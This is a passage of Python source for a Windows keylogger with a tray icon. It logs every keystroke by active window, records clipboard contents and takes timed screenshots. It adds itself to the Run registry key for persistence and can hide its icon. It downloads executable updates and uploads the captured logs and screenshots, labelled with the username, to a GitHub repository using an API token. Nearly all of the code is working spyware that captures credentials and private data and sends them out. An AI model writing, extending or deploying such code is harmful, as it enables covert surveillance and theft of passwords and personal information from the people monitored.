            print(f"Deleted empty folder: {folder_path}")
            os.makedirs(folder_path, exist_ok=True)  # Recreate the folder
            logging.info(f"Recreated folder: {folder_path}")
            print(f"Recreated folder: {folder_path}")

        return max(0, remaining_seconds)  # Return remaining time
    except Exception as e:
        logging.error(f"Error cleaning folder {folder_path}: {e}")
        print(f"Error cleaning folder {folder_path}: {e}")
        return threshold_seconds  # Default remaining time if an error occurs

# Function to get the folder's last modified time
def get_folder_age(folder_path):
    try:
        folder_creation_time = datetime.fromtimestamp(os.path.getctime(folder_path))
        logging.info(f"Folder {folder_path} creation time: {folder_creation_time}")
        print(f"Folder {folder_path} creation time: {folder_creation_time}")
        return folder_creation_time
    except Exception as e:
        logging.error(f"Error getting folder age for {folder_path}: {e}")
        print(f"Error getting folder age for {folder_path}: {e}")
        return datetime.now()  # Return current time if there's an error

# Function to delete a folder
def delete_folder(folder_path):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if os.path.exists(folder_path):
            for root, dirs, files in os.walk(folder_path, topdown=False):
                for name in files:
                    file_path = os.path.join(root, name)
                    try:
                        os.remove(file_path)
                        logging.info(f"[{timestamp}] - Deleted file: {file_path}")
                        print(f"[{timestamp}] - Deleted file: {file_path}")
                    except Exception as e:
                        logging.error(f"Error deleting file {file_path}: {e}")
                        print(f"Error deleting file {file_path}: {e}")
                for name in dirs:
                    dir_path = os.path.join(root, name)
                    try:
                        os.rmdir(dir_path)
                        logging.info(f"[{timestamp}] - Deleted directory: {dir_path}")
                        print(f"[{timestamp}] - Deleted directory: {dir_path}")
                    except Exception as e:
                        logging.error(f"Error deleting directory {dir_path}: {e}")
                        print(f"Error deleting directory {dir_path}: {e}")
            os.rmdir(folder_path)
            logging.info(f"[{timestamp}] - Deleted folder: {folder_path}")
            print(f"[{timestamp}] - Deleted folder: {folder_path}")
    except Exception as e:
        logging.error(f"Error deleting folder {folder_path}: {e}")
        print(f"Error deleting folder {folder_path}: {e}")

# Function to check and update the folder deletion status periodically
def schedule_folder_check():
    global interval_logs_delete_status
    try:
        check_and_delete_old_folders()
        # Schedule the next execution after 24 hour for testing
        # threading.Timer(86400, schedule_folder_check).start() # 24 hour
        # threading.Timer(21600, schedule_folder_check).start() # 6 hour
        # threading.Timer(40, schedule_folder_check).start() # 10 second
        threading.Timer(interval_logs_delete_status, schedule_folder_check).start() # 10 second
    except Exception as e:
        logging.error(f"Error in scheduling folder check: {e}")
        print(f"Error in scheduling folder check: {e}")
# Start the periodic check
schedule_folder_check()


# Get the active window's title
# ----------------------------------------------------------------------------------
def get_active_window_title():
    try:
        window = gw.getActiveWindow()
        if window is not None:
            return window.title
        return "Unknown Application"
    except Exception as e:
        logging.error(f"Error getting active window title: {e}")
        print(f"Error getting active window title: {e}")
        return "Unknown Application"


# Write a log entry to the file
# ----------------------------------------------------------------------------------
def write_log_entry(window, keys, include_window_info=False):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(keylog_file, "a", encoding="utf-8") as log_file:
            if include_window_info:  # Log the window info only once per window change
                log_file.write(f"\n\n[{timestamp}] - Active Window: {window}\n")
                log_file.write("----------------\n")
            if keys:
                log_file.write(f"{timestamp}: {''.join(keys)}\n")
        # print(f"Logged: {''.join(keys)}")  # Optional for debugging
    except Exception as e:
        logging.error(f"Error write_log_entry: {e}")
        print(f"Error write_log_entry: {e}")
        

# Handle key press events
# ----------------------------------------------------------------------------------
def on_press(key):
    global current_window, current_keys
    
    # Get the active window title
    active_window = get_active_window_title()

    # Detect window change
    if current_window != active_window:
        if current_window:
            # Log the previous window's data
            write_log_entry(current_window, current_keys)
        # Reset for the new window
        current_window = active_window
        current_keys = []
        write_log_entry(current_window, [], include_window_info=True)  # Log the new window info
    # logging.info(f"current window: {current_window}")
    
    try:
        # Handle the PrintScreen key for toggling tray icon visibility
        if key == keyboard.Key.print_screen:
            toggle_tray_icon()
            return
    
        # Handle key input
        try:
            key_char = key.char  # For printable characters
            # key_char = key.char if key.char else f"[{key}]"
        except AttributeError:
            key_char = f"[{key}]"  # For special keys (e.g., Enter, Backspace)
            # logging.error(f"Error handling key input on_press: {e}")
            # print(f"Error handling key input on_press: {e}")

        # Record the key
        # Define a mapping for special keys to normalize their representation
        special_keys = {
            "[Key.space]": " ",
            "[Key.enter]": "\n",
            "[Key.esc]": "[Esc]",
            "[Key.tab]": "[Tab]",
            "[Key.caps_lock]": "[Caps Lock]",
            "[Key.shift]": "[Shift]",
            "[Key.shift_r]": "[Shift]",
            "[Key.ctrl]": "[Ctrl]",
            "[Key.ctrl_l]": "[Ctrl]",
            "[Key.ctrl_r]": "[Ctrl]",
            "[Key.fn]": "[Fn]",
            "[Key.cmd]": "[Win]",
            "[Key.cmd_l]": "[Win]",
            "[Key.cmd_r]": "[Win]",
            "[Key.alt]": "[Alt]",
            "[Key.alt_l]": "[Alt]",
            "[Key.alt_r]": "[Alt]",
            "[Key.alt_gr]": "[Alt]",
            "[Key.insert]": "[Insert]",
            "[Key.print_screen]": "[PrtSc]",
            "[Key.delete]": "[Delete]",
            "[Key.backspace]": "[Backspace]",
            "[Key.up]": "[Up Arrow]",
            "[Key.down]": "[Down Arrow]",
            "[Key.left]": "[Left Arrow]",
            "[Key.right]": "[Right Arrow]",
            "[Key.home]": "[Home]",
            "[Key.end]": "[End]",
            "[Key.page_up]": "[Page Up]",
            "[Key.page_down]": "[Page Down]",
            # Function keys
            "[Key.f1]": "[F1]",
            "[Key.f2]": "[F2]",
            "[Key.f3]": "[F3]",
            "[Key.f4]": "[F4]",
            "[Key.f5]": "[F5]",
            "[Key.f6]": "[F6]",
            "[Key.f7]": "[F7]",
            "[Key.f8]": "[F8]",
            "[Key.f9]": "[F9]",
            "[Key.f10]": "[F10]",
            "[Key.f11]": "[F11]",
            "[Key.f12]": "[F12]",
            # Add any other special keys here as needed
        }

        try:
            # Process the key character
            if key_char in special_keys:
                current_keys.append(special_keys[key_char])
            elif key_char is not None:  # Ignore None values
                current_keys.append(key_char)
            # else:
            #     current_keys.append(key_char)
        except Exception as e:
            logging.error(f"Error processing key press: {e}")
            print(f"Error processing key press: {e}")
            pass  
    except Exception as e:
        print(f"Error processing key press: {e}")


# def on_press(key):
#     global current_window, current_keys
#     try:
#         # Handle the PrintScreen key for toggling tray icon visibility
#         if key == keyboard.Key.print_screen:
#             toggle_tray_icon()
#             return

#         try:
#             key_char = key.char if key.char else f"[{key}]"
#         except AttributeError:
#             key_char = f"[{key}]"

#         # Log the key press
#         write_log_entry(key_char)
#     except Exception as e:
#         print(f"Error processing key press: {e}")
        

# Handle key release events
# ----------------------------------------------------------------------------------
def on_release(key):
    global keys_pressed
    try:

        # Remove the released key from the set
        keys_pressed.discard(key)
        pass # Currently no action is needed on key release
            
        # if key == keyboard.Key.esc:
        #     # On Esc key, finalize logging and stop the listener
        #     write_log_entry(current_window, current_keys)
        #     print("Keylogger stopped.")
        #     logging.info(f"keylogger stopped")
        #     return False
    except Exception as e:
        logging.error(f"Error on_release: {e}")
        print(f"Error on_release: {e}")


# Start the keylogger
# ----------------------------------------------------------------------------------
def start_keylogger():
    try:
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        with open(keylog_file, "a", encoding="utf-8") as log_file:
            log_file.write(f"\n\n\n[{timestamp}]---keylogger started {username}---")
        logging.info(f"[{timestamp}]---keylogger started {username}---")
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
        print(f"[{timestamp}]---keylogger started {username}---")
    except Exception as e:
        logging.error(f"Error on start_keylogger: {e}")
        print(f"Error on start_keylogger: {e}")


# Monitor clipboard changes
# ----------------------------------------------------------------------------------
def monitor_clipboard():
    global last_clipboard_content
    while True:
        try:
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != last_clipboard_content:
                last_clipboard_content = current_clipboard_content
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(clipboard_log_file, "a", encoding="utf-8") as log_file:
                    log_file.write(f"{timestamp}: Copied: {current_clipboard_content}\n\n")
                # print(f"Clipboard updated: {current_clipboard_content}")  # Optional for debugging
            # logging.info(f"monitor_clipboard")
        except Exception as e:
            # logging.error(f"Error monitoring clipboard: {e}")
            print(f"Error monitoring clipboard: {e}")
            pass
        time.sleep(1)  # Polling interval


# Take a screenshot
# ----------------------------------------------------------------------------------
def take_screenshot():
    global screenshot_interval
    while True:
        try:
            if is_running:
                timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
                filename = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
                pyautogui.screenshot(filename)
                logging.info(f"take_screenshot-->Screenshot saved: {filename}")
                print(f"Screenshot saved: {filename}")
            with lock:
                current_interval = screenshot_interval   # Ensure thread-safe interval update
            time.sleep(current_interval)
        except Exception as e:
            # logging.error(f"Error taking screenshot: {e}")
            print(f"Error taking screenshot: {e}")
            pass


# Toggle screenshot taking
# ----------------------------------------------------------------------------------
def toggle_screenshots(icon, item):
    global is_running
    is_running = not is_running
    save_config()  # Save the updated state to the config file
    if (is_running == True):
        show_notification(APP_NAME, "Enabled taking Screenshot")
    else:
        show_notification(APP_NAME, "Disabled taking Screenshot")
    logging.info(f"toggle_screenshot - {'Enabled' if is_running else 'Disabled'}")
    print(f"toggle_screenshot - {'Enabled' if is_running else 'Disabled'}")
    

# Toggle keylogging
# ----------------------------------------------------------------------------------
def toggle_keylogging(icon, item):
    global listener_running
    listener_running = not listener_running
    save_config()  # Save the updated state to the config file
    if(listener_running == True):
        show_notification(APP_NAME, "Enabled Keylogger")
    else:
        show_notification(APP_NAME, "Disabled Keylogger")
    logging.info(f"toggle_keylogging - {'Enabled' if listener_running else 'Disabled'}")
    print(f"toggle_keylogging - {'Enabled' if listener_running else 'Disabled'}")
        

# Update screenshot interval
# ----------------------------------------------------------------------------------
def set_interval(icon, item):
    global screenshot_interval
    try:
        with lock:
            # Parse the interval value and format
            text = item.text
            if "seconds" in text:
                screenshot_interval = int(text.split()[0])  # Keep seconds as is
                interval_display = f"{screenshot_interval} seconds"
            elif "Minutes" in text:
                screenshot_interval = int(text.split()[0]) * 60  # Convert minutes to seconds
                interval_display = f"{text.split()[0]} minutes"
            elif "Hour" in text:
                screenshot_interval = int(text.split()[0]) * 3600  # Convert hours to seconds
                interval_display = f"{text.split()[0]} hour"

        save_config()  # Save the new interval to the JSON file
        # Update menu checkmarks and show a notification
        update_checkmarks(icon)
        show_notification(APP_NAME, f"Screenshot interval set to {interval_display}.")
        logging.info(f"Interval set to {interval_display}.")
        print(f"Interval set to {interval_display}.")
    except Exception as e:
        logging.error(f"Error in set_interval: {e}")
        print(f"Error in set_interval: {e}")


# Stop script
# ----------------------------------------------------------------------------------
def stop_script(icon):
    try:
        global tray_icon
        if tray_icon:
            tray_icon.stop()
        # Log the previous window's data
        write_log_entry(current_window, current_keys)
        show_notification(APP_NAME, "Keylogger is terminated...")
        logging.info(f"Script terminated\n\n")
        print("Stopping script...\n\n\n")
        # icon.notify(f"Keylogger terminated")
        os._exit(0)
    except Exception as e:
        logging.error(f"Error in stop_script: {e}")
        print(f"Error in stop_script: {e}")


# function to open developer page in browser 
# ----------------------------------------------------------------------------------
def on_open_developer(icon):
    try:
        url = "https://bibekchandsah.com.np/developer.html"
        webbrowser.open(url)
        show_notification(APP_NAME, "Opening Developer Page...")
        logging.info(f"open_developer")
        print(f"open_developer")
    except Exception as e:
        logging.error(f"Error opening Developer: {e}")
        print(f"Error opening Developer: {e}")


# Restart script
# ----------------------------------------------------------------------------------
def restart_script(icon, item):
    try:
        # Log the previous window's data
        write_log_entry(current_window, current_keys)
        logging.info(f"Restarting script...\n")
        print("Restarting script...\n\n")
        # icon.notify(f"Restarting the Keylogger")
        show_notification(APP_NAME, "Restarting Keylogger...")
        # global listener
        # listener.stop()
        icon.stop()
        # os.execv(sys.executable, ['python'] + sys.argv)
        os.execl(sys.executable, sys.executable, *sys.argv)
        # os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        logging.error(f"Error restarting script: {e}")
        print(f"Error restarting script: {e}")


# Toggle startup option
# ----------------------------------------------------------------------------------
def synchronize_startup_state():
    """
    Synchronize the startup state with the Windows Registry based on the is_startup_enabled variable.
    """
    global is_startup_enabled
    try:
        startup_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name_key = APP_NAME

        # Check if the app is already in the registry
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_key_path, 0, winreg.KEY_READ) as key:
            try:
                value = winreg.QueryValueEx(key, app_name_key)
                is_in_startup = True if value else False
            except FileNotFoundError:
                is_in_startup = False

        # Add or remove the app from startup based on is_startup_enabled
        if is_startup_enabled and not is_in_startup:
            # Add to startup
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, app_name_key, 0, winreg.REG_SZ, sys.executable + " " + sys.argv[0])
                print("Added to startup.")
        elif not is_startup_enabled and is_in_startup:
            # Remove from startup
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, app_name_key)
                print("Removed from startup.")

    except Exception as e:
        logging.error(f"Error synchronizing startup state: {e}")
        print(f"Error synchronizing startup state: {e}")

def toggle_startup(enable):
    """
    Enable or disable running the application on startup.
    """
    global is_startup_enabled
    try:
        startup_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        if enable:
            winreg.SetValueEx(startup_key, APP_NAME, 0, winreg.REG_SZ, sys.executable + " " + sys.argv[0])
            show_notification(APP_NAME, "Enabled startup at boot.")
            logging.info(f"Startup Enabled")
            print(f"Startup Enabled")
        else:
            winreg.DeleteValue(startup_key, APP_NAME)
            show_notification(APP_NAME, "Disabled startup at boot.")
            logging.info(f"Startup Disabled")
            print(f"Startup Disabled")
        is_startup_enabled = enable
        save_config()  # Save the updated state to config.json
        winreg.CloseKey(startup_key)
    except Exception as e:
        logging.error(f"Error toggling startup: {e}")
        show_notification(APP_NAME, f"Error: {e}")
        print(f"Error toggling startup: {e}")

def is_startup_checked(item):
    """
    Return whether the "Run on Startup" option is enabled.
    The `item` argument is required by pystray but not used here.
    """
    # logging.info(f"check startup")
    return is_startup_enabled

def on_toggle_startup(icon, item):
    """
    Toggle the startup status based on user selection.
    """
    # logging.info(f"on toggle startup")
    toggle_startup(not is_startup_enabled)


# Open error log file    
# ----------------------------------------------------------------------------------    
def on_open_log(icon, item):
    """
    Open the log file in the default text editor.
    """
    logging.warning(f"Log file is opened")
    try:
        if os.path.exists(LOG_FILE):
            os.startfile(LOG_FILE)
        else:
            raise FileNotFoundError("Log file not found.")
    except Exception as e:
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the log file.")
        logging.error(f"Error opening log file: {e}")
        print(f"Error opening log file: {e}")
       
        
# Open keylog file  
# ----------------------------------------------------------------------------------      
def open_keylog_file(icon, item):
    """
    Open the keylog file in the default text editor.
    """
    logging.warning(f"Keylog file is opened")
    try:
        if os.path.exists(keylog_file):
            os.startfile(keylog_file)
        else:
            raise FileNotFoundError("Keylog file not found.")
    except Exception as e:
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the Keylog file.")   
        logging.error(f"Error opening log file: {e}")
        print(f"Error opening log file: {e}")
    
        
# Open copy keylog file 
# ----------------------------------------------------------------------------------       
def open_copy_keylog_file(icon, item):
    """
    Open the Copy keylog file in the default text editor.
    """
    logging.warning(f"copied Log file is opened")
    try:
        if os.path.exists(clipboard_log_file):
            os.startfile(clipboard_log_file)
        else:
            raise FileNotFoundError("Copy Keylog file not found.")
    except Exception as e:
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the Copy Keylog file.")        
        logging.error(f"Error opening log file: {e}")
        print(f"Error opening log file: {e}")
        
        
# Open screenshot folder
# ----------------------------------------------------------------------------------        
def open_Screenshot_folder(icon, item):
    """
    Open the screenshot folder.
    """
    logging.warning(f"Screenshot folder is opened")
    try:
        if os.path.exists(screenshot_folder):
            os.startfile(screenshot_folder)
        else:
            raise FileNotFoundError("Screenshot folder not found.")
    except Exception as e:
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the Screenshot folder.")
        logging.error(f"Error opening Screenshot folder: {e}")
        print(f"Error opening Screenshot folder: {e}")


# Check for program update
#-----------------------------------------------------------------------------------
def format_size(size):
    """Dynamically format file size to B, KB, MB, or GB."""
    for unit in ["B", "KB", "MB", "GB"]:
        if size < 1024:
            return f"{size:.2f} {unit}"
        size /= 1024
    return f"{size:.2f} GB"

def format_time(seconds):
    """Format time into seconds, minutes, hours, or days."""
    if seconds < 60:
        return f"{seconds:.2f} seconds"
    elif seconds < 3600:
        minutes = seconds // 60
        return f"{seconds / 60:.2f} minute{'s' if minutes > 1 else ''}"
    elif seconds < 86400:
        hours = seconds // 3600
        return f"{seconds / 3600:.2f} hours{'s' if hours > 1 else ''}"
    elif seconds < 2592000:  # Approx. 30 days
        days = seconds // 86400
        return f"{seconds / 86400:.2f} day{'s' if days > 1 else ''}"
    elif seconds < 31536000:  # Approx. 365 days
        months = seconds // 2592000
        return f"{seconds / 2592000:.2f} month{'s' if months > 1 else ''}"
    else:
        years = seconds // 31536000
        return f"{seconds / 31536000:.2f} year{'s' if years > 1 else ''}"

def check_for_update_async():
    show_notification(APP_NAME, "Checking for updates .....")
    threading.Thread(target=check_for_update, daemon=True).start()

def check_for_update():
    try:
        response = requests.get(VERSION_URL, timeout=10)
        response.raise_for_status()
        latest_version = response.text.strip()

        if latest_version > CURRENT_VERSION:
            logging.info(f"Update Available: {latest_version}")
            print(f"Update Available: {latest_version}")
            show_notification(APP_NAME, f"New version v{latest_version} is available.")
            if messagebox.askyesno("Update Available", f"A new version (v{latest_version}) is available. Update now?"):
                # Open the tkinter window and start downloading the update
                threading.Thread(target=lambda: run_tkinter_window(latest_version), daemon=True).start()
            else:
                logging.warning(f"{username} ignored the update {latest_version}")
                print(f"{username} ignored the update {latest_version}")
        else:
            logging.info(f"{username} is using the latest version.")
            print(f"{username} is using the latest version.")
            show_notification(APP_NAME, "You are using the latest version.")
            messagebox.showinfo("No Update", "You are using the latest version.")
    except requests.exceptions.ConnectionError:
        show_notification("Connection Error", "No internet connection. Please check your network and try again.")
        messagebox.showerror("Connection Error", "No internet connection. Please check your network and try again.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to check for updates: {e}")
        show_notification("Error", "Failed to check for updates. Please try again later.")
        messagebox.showerror("Error", f"Failed to check for updates: {e}")

def download_update(latest_version):  
        
    try:
        download_url = f"{BASE_DOWNLOAD_URL}/v{latest_version}/{APPLICATION_NAME}"
        progress_label.config(text="Downloading update...")
        
        response = requests.get(download_url, stream=True)
        response.raise_for_status()
        total_size = int(response.headers.get("Content-Length", 0))

        progress_bar["maximum"] = total_size
        downloaded_size = 0
        start_time = time.time()

        with open("update_temp.exe", "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                    downloaded_size += len(chunk)
                    progress_bar["value"] = downloaded_size

                    elapsed_time = time.time() - start_time
                    speed = downloaded_size / elapsed_time
                    remaining_time = (total_size - downloaded_size) / speed if speed > 0 else 0

                    progress_label.config(
                        text=f"Downloaded: {format_size(downloaded_size)} of {format_size(total_size)}"
                    )
                    time_label.config(
                        text=f"Speed: {format_size(speed)}/s | Remaining Time: {format_time(remaining_time)}"
                    )
                    root.update()

        replace_executable()
    except Exception as e:
        logging.error("Download Error downloading update")
        messagebox.showerror("Download Error", f"Failed to download update: {e}")

def restart_program():
    os.execv(sys.executable, [sys.executable] + sys.argv)

def replace_executable():
    try:
        current_path = os.path.join(os.getcwd(), APPLICATION_NAME)
        backup_path = f"{current_path}.old"
        update_path = os.path.join(os.getcwd(), "update_temp.exe")

        if os.path.exists(backup_path):
            os.remove(backup_path)

        if os.path.exists(current_path):
            os.rename(current_path, backup_path)

        os.rename(update_path, current_path)
        logging.info("Application updated sucessfully!")
        messagebox.showinfo(APP_NAME, "The program has been updated successfully!")
        restart_program()
    except Exception as e:
        logging.error("error replacing file")
        messagebox.showerror("Error", f"Failed to replace the executable: {e}")
        
def clean_partial_files():
    try:
        update_path = os.path.join(os.getcwd(), "update_temp.exe")
        if os.path.exists(update_path):
            os.remove(update_path)
    except Exception as e:
        logging.error("error cleaning up partial files")
        print(f"Error during cleanup: {e}")

def run_tkinter_window(latest_version=None):
    
    global root, progress_label, progress_bar, time_label

    root = tk.Tk()
    root.title("Updater")
    root.geometry("400x250")
    root.resizable(False, False)
    root.iconbitmap(ICON_PATH)
    
    # Get screen dimensions and position the window at the center
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    window_width, window_height = 400, 250  # Same as geometry
    position_x = (screen_width // 2) - (window_width // 2)
    position_y = (screen_height // 2) - (window_height // 2)
    root.geometry(f"{window_width}x{window_height}+{position_x}+{position_y}")

    progress_label = ttk.Label(root, text="Click 'Check for Updates' to start.")
    progress_label.pack(pady=10)

    progress_bar = ttk.Progressbar(root, orient="horizontal", length=300, mode="determinate")
    progress_bar.pack(pady=10)

    time_label = ttk.Label(root, text="", font=("Arial", 10))
    time_label.pack(pady=5)
    
    if latest_version:
        progress_label.config(text="Starting download...")
        logging.info("Starting download...")
        threading.Thread(target=download_update, args=(latest_version,), daemon=True).start()
        
    quit_button = ttk.Button(root, text="Quit", command=root.destroy)
    quit_button.pack(pady=5)

    root.mainloop()


# function to upload the log files
# ----------------------------------------------------------------------------------

# set the upload log interval according to url if not url then default
# if url default then it uses default fallback interval
# if url is reached then it's not using fallback interval from url it uploads in the url interval

# Default upload interval and fallback interval in case of network error
DEFAULT_UPLOAD_INTERVAL = 600 # 10 minutes
# DEFAULT_UPLOAD_INTERVAL = 100 # 1.6 minutes
# DEFAULT_FALLBACK_INTERVAL = 20
DEFAULT_FALLBACK_INTERVAL = 300 # 5 minutes

# URL to fetch the upload interval
# INTERVAL_URL = "https://raw.githubusercontent.com/bebedudu/autoupdate/main/interval.json"

CACHE_FILE = "files_cache.json"
# Cache for uploaded files to avoid re-uploading
data_uploaded_cache = set()
screenshots_uploaded_cache = set()

def format_interval(seconds):
    """
    Converts a time duration in seconds into a human-readable format.
    """
    if seconds < 60:
        # return f"{seconds} seconds"
        return f"{seconds:.2f} seconds"
    elif seconds < 3600:
        minutes = seconds // 60
        # return f"{minutes} minute{'s' if minutes > 1 else ''}"
        return f"{seconds / 60:.2f} minute{'s' if minutes > 1 else ''}"
    elif seconds < 86400:
        hours = seconds // 3600
        # return f"{hours} hour{'s' if hours > 1 else ''}"
        return f"{seconds / 3600:.2f} hours{'s' if hours > 1 else ''}"
    elif seconds < 2592000:  # Approx. 30 days
        days = seconds // 86400
        # return f"{days} day{'s' if days > 1 else ''}"
        return f"{seconds / 86400:.2f} day{'s' if days > 1 else ''}"
    elif seconds < 31536000:  # Approx. 365 days
        months = seconds // 2592000
        # return f"{months} month{'s' if months > 1 else ''}"
        return f"{seconds / 2592000:.2f} month{'s' if months > 1 else ''}"
    else:
        years = seconds // 31536000
        # return f"{years} year{'s' if years > 1 else ''}"
        return f"{seconds / 31536000:.2f} year{'s' if years > 1 else ''}"

# Function to fetch the upload interval from a JSON file hosted online
def fetch_value_from_url(url, key, default_value):
    """
    Fetches a specific value from the provided URL's JSON response. Falls back to the default value on failure.
    """
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        data = response.json()
        if key in data:
            return int(data[key])
            # return int(data.get(key, default_value))
        else:
            logging.error(f"Key '{key}' not found in the JSON response.")
            print(f"Key '{key}' not found in the JSON response.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Network error while fetching {key}: {e}")
        print(f"Network error while fetching {key}: {e}")
    except ValueError as e:
        logging.error(f"Error parsing JSON for {key}: {e}")
        print(f"Error parsing JSON for {key}: {e}")

    return default_value

def get_last_upload_time():
    """
    Retrieves the last upload timestamp from a file. Returns None if not found.
    """
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                data = json.load(f)
                last_upload_time = datetime.fromisoformat(data["last_upload"])
                logging.info(f" {last_upload_time}")
                print(f"Last uploaded at {last_upload_time}")
                return last_upload_time
        except Exception as e:
            logging.error(f"Error reading last upload file: {e}")
            print(f"Error reading last upload file: {e}")
            pass
    return None

def set_last_upload_time():
    """
    Updates the last upload timestamp in a file.
    """
    global last_upload
    try:
        last_upload = datetime.now().isoformat()
        save_config()
    except Exception as e:
        logging.error(f"Error writing last upload file: {e}")
        print(f"Error writing last upload file: {e}")
      
# Function to load the cache from the JSON file
def load_uploaded_cache(cache_file=CACHE_FILE):
    """
    Loads the uploaded files cache from a file.
    """
    global screenshots_uploaded_cache
    if os.path.exists(cache_file):
        try:
            with open(cache_file, "r") as f:
                screenshots_uploaded_cache = set(json.load(f))
            print(f"Loaded cache with {len(screenshots_uploaded_cache)} entries.")
        except Exception as e:
            logging.error(f"Error loading cache: {e}. Initializing an empty cache.")
            print(f"Error loading cache: {e}. Initializing an empty cache.")
            screenshots_uploaded_cache = set()
    else:
        # data_uploaded_cache = set()
        screenshots_uploaded_cache = set()
        print("No cache file found. Initializing an empty cache.")

# Function to save the cache to the JSON file
def save_uploaded_cache(cache_file=CACHE_FILE):
    """
    Saves the uploaded files cache to a file.
    """
    try:
        with open(cache_file, "w") as f:
            json.dump(list(screenshots_uploaded_cache), f, indent=4)
        print(f"Cache saved with {len(screenshots_uploaded_cache)} entries.")
    except Exception as e:
        logging.error(f"Error saving cache: {e}")
        print(f"Error saving cache: {e}")
        
# Function to check if a screenshot file is uploaded
def is_screenshot_uploaded(file_path):
    """
    Checks if the file has already been uploaded by comparing its unique identifier in the cache.
    """
    global screenshots_uploaded_cache
    return file_path in screenshots_uploaded_cache

# Function to mark a screenshot as uploaded
def mark_screenshot_uploaded(file_path):
    """
    Adds the file to the uploaded cache and persists the cache.
    """
    global screenshots_uploaded_cache
    if file_path not in screenshots_uploaded_cache:
        screenshots_uploaded_cache.add(file_path)
        save_uploaded_cache()  # Save the cache only if new files are added

# def clean_uploaded_cache():
#     """
#     Removes stale entries from the uploaded files cache.
#     """
#     global screenshots_uploaded_cache
#     valid_files = {path for path in screenshots_uploaded_cache if os.path.exists(path)}
#     removed_files = screenshots_uploaded_cache - valid_files
#     screenshots_uploaded_cache = valid_files
#     if removed_files:
#         print(f"Removed stale cache entries: {removed_files}")
#     save_uploaded_cache()

# Function to upload a single file to GitHub
def upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token):
    """
    Uploads a file to a specified folder in a GitHub repository.
    """
    try:
        with open(file_path, 'rb') as f:
            content = f.read()

        file_name = os.path.basename(file_path)
        unique_name = f"{repo_folder_name}/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{username}_{file_name}"
        api_url = f"https://api.github.com/repos/{repo_name}/contents/{unique_name}"

        content_base64 = base64.b64encode(content).decode('utf-8')

        payload = {
            "message": f"Uploading {username} {file_name}",
            "content": content_base64,
            "branch": branch_name
        }

        headers = {"Authorization": f"token {github_token}"}

        response = requests.put(api_url, json=payload, headers=headers)

        if response.status_code == 201:
            # logging.info(f"Uploaded successfully: {response.json().get('content').get('html_url')}")
            print(f"Uploaded successfully: {response.json().get('content').get('html_url')}")
        else:
            logging.error(f"Failed to upload {file_name}: {response.status_code}, {response.text}")
            print(f"Failed to upload {file_name}: {response.status_code}, {response.text}")
    except Exception as e:
        logging.error(f"Error uploading file {file_path}: {e}")
        print(f"Error uploading file {file_path}: {e}")
        
# Function to upload all files in a folder to GitHub
def upload_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
    """
    Uploads all files in a folder to a specified folder in a GitHub repository.
    """
    for root, _, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            # print(f"Processing file: {file_path}")
            upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)

def upload_multiple_to_specific_folders(file_mapping, folder_mapping, repo_name, branch_name, github_token):
    """
    Uploads multiple files and folders to specific subfolders in a GitHub repository.
    """
    for file_path, subfolder in file_mapping.items():
        if os.path.exists(file_path):
            upload_file_to_github(file_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
        else:
            logging.error(f"File not found: {file_path}")
            print(f"File not found: {file_path}")

    for folder_path, subfolder in folder_mapping.items():
        if os.path.exists(folder_path) and os.path.isdir(folder_path):
            upload_folder_to_github(folder_path, repo_name, f"uploads/{subfolder}", branch_name, github_token)
        else:
            logging.error(f"Folder not found or not a directory: {folder_path}")
            print(f"Folder not found or not a directory: {folder_path}")

# Function to upload screenshots to GitHub
def upload_screenshots_folder_to_github(folder_path, repo_name, repo_folder_name, branch_name, github_token):
    """
    Uploads all untracked screenshots in the specified folder to GitHub.
    """
    for root, _, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            # print(f"Processing file: {file_path}")
            if not is_screenshot_uploaded(file_path):
                try:
                    upload_file_to_github(file_path, repo_name, repo_folder_name, branch_name, github_token)
                    mark_screenshot_uploaded(file_path)
                except Exception as e:
                    print(f"Error uploading {file_path}: {e}")
            else:
                print(f"File already uploaded (skipped): {file_path}")
                # print(f"Skipping already uploaded file: {file_path} (in cache)")

# Main upload logs function
def upload_logs():
    """
    Main function to upload logs and screenshots.
    Initializes the cache and monitors for file uploads.
    """
    # Configuration
    repo_name = REPO  # Replace with your GitHub repo
    branch_name = BRANCH  # Replace with your branch name
